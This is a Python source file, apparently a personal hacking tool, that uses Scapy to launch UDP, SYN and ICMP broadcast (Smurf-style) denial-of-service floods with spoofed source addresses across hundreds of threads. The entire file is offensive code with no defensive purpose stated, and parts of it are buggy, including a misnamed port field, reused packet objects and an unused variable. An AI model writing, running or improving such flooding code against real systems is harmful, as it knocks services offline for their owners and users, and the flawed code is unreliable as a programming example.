#Auteur --> aiglematth

#Imports
from scapy.all import *
from threading import Thread
import myip

#Classe des floods
class Flood():
    def __init__(self):
        self.ipToOff = ""
        self.ipSpoof = myip.discoverMyIp().ip
        self.ipSpoofs = []
        self.port = 0
        self.ports = []
        self.name = "TYPE"

    def addIpAndPortsToPackets(self, packet):
        packetsReady = []
        pkt = packet
        if self.ipSpoofs == None:
            pkt.src = self.ipSpoof
            packetsReady.append(pkt)
        else:
            for ip in self.ipSpoofs:
                pkt.src = ip
                packetsReady.append(pkt)

        if self.ports == None:
            for packet in packetsReady:
                packet.payload.pdst = self.port
        else:
            for packet in packetsReady:
                pkt = packetsReady.pop()
                for port in self.ports:
                    pkt.payload.pdst = port
                    packetsReady.append(pkt)
        return packetsReady

    def determineThreads(self, discretion):
        if discretion < 10:
            return 1000
        elif discretion < 20:
            return 800
        elif discretion < 50:
            return 500
        elif discretion < 90:
            return 300
        else:
            return 200

    def convertTimeoutToInterAndCount(self, timeout, discretion):
        inter = 10 * discretion / 100
        count = timeout // inter
        return (inter, count)

    def abstractFlood(self, packets, threads=1, timeout=5, discretion=1):
        (inter, count) = self.convertTimeoutToInterAndCount(timeout, discretion)
        listeOfThreads = []
        for x in range(0, threads):
            thr = ThreadFlood(packets, inter, count)
            listeOfThreads.append(thr)

        for thr in listeOfThreads:
            thr.start()
            print("Thread {} lancé...".format(thr.ident))

        for thr in listeOfThreads:
            thr.join()
            print("Thread {} join...".format(thr.ident))

    #Les floods
    def Flood(self, timeout=5, discretion=1):
        pass

class UdpFlood(Flood):
    def __init__(self):
        Flood.__init__(self)
        self.name = "UDP"

    def Flood(self, timeout=5, discretion=1):
        udpacket = IP(dst=self.ipToOff) / UDP()
        udpacket = self.addIpAndPortsToPackets(udpacket)
        threads = self.determineThreads(discretion)
        self.abstractFlood(udpacket, threads, timeout, discretion)

class SynFlood(Flood):
    def __init__(self):
        Flood.__init__(self)
        self.name = "SYN"

    def Flood(self, timeout=5, discretion=1):
        synpacket = IP(dst=self.ipToOff) / TCP(flags="S")
        synacket = self.addIpAndPortsToPackets(synpacket)
        threads = self.determineThreads(discretion)
        self.abstractFlood(synpacket, threads, timeout, discretion)

class IcmpFlood(Flood):
    def __init__(self):
        Flood.__init__(self)
        self.broadcast = ""
        self.name = "ICMP"

    def brBr(self, rep):
        tmp = self.ipSpoof.split(".")
        tmp_dos = []
        x = 1
        while rep > 0:
            tmp.__delitem__(len(tmp)-x)
            tmp.append("255")
            rep -= 1
            x += 1
        for x in tmp:
            tmp_dos.append(x)
            tmp_dos.append(".")
        tmp_dos.pop()
        for x in tmp_dos:
            self.broadcast += x

    def searchBroadcast(self):
        broadcastMask = bin(int(self.ipSpoof.split(".")[0])).split("b")[1]
        while len(broadcastMask) < 8:
            broadcastMask = "0" + broadcastMask
        if broadcastMask[0] == "0":
            self.brBr(1)
        elif broadcastMask[0:2] == "10":
            self.brBr(2)
        elif broadcastMask[0:2] == "11":
            self.brBr(3)

    def Flood(self, timeout=5, discretion=1):
        icmpacket = IP(dst=self.broadcast, src=self.ipSpoof) / ICMP()
        threads = self.determineThreads(discretion)
        self.abstractFlood(icmpacket, threads, timeout, discretion)


#Classe des threads d'envoi
class ThreadFlood(Thread):
    def __init__(self, packet, inter, count):
        Thread.__init__(self)
        self.packet = packet
        self.inter = inter
        self.count = count

    def run(self):
        send(self.packet, inter=self.inter, count=self.count)

if __name__ == "__main__":
    f = Flood()
